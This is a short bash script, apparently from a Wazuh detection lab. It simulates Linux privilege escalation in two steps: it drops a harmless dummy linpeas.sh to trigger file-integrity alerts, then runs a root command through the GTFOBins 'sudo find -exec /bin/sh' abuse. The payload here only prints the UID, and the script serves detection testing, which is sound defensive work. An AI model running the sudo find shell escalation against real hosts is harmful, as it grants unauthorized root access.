#!/bin/bash
# ==============================================================================
# Script Name   : privesc_sim.sh
# Description   : Simulates a Linux Privilege Escalation attack vector.
#                 1. Drops a suspicious script to trigger FIM/Active Response.
#                 2. Exploits GTFOBins (sudo find) to attempt root shell escalation.
# Author        : ARALREZ 
# Target Host   : Agent (Victim)
# ==============================================================================

set -e

echo "[*] Step 1: Dropping a suspicious script in /tmp to trigger FIM detection..."
# Create a dummy script mimicking common privilege escalation enumeration tools
echo "echo '[-] Unauthorized execution attempt of linpeas.sh'" > /tmp/linpeas.sh
chmod +x /tmp/linpeas.sh

echo "[+] File /tmp/linpeas.sh created. Active Response should trigger shortly."
echo ""

echo "[*] Step 2: Attempting GTFOBins Privilege Escalation via 'sudo find'..."
# Executes 'id' via find -exec to demonstrate binary abuse under sudo permissions
if sudo find . -exec /bin/sh -c 'echo "[+] Current UID: $(id -u) (0 = root)"' \; 2>/dev/null; then
    echo "[!] Sudo GTFOBins exploitation step executed successfully."
else
    echo "[-] Failed to execute sudo find. Ensure /etc/sudoers is configured for testing."
fi

echo ""
echo "[*] Simulation script finished. Verify quarantine status and Wazuh dashboard alerts."
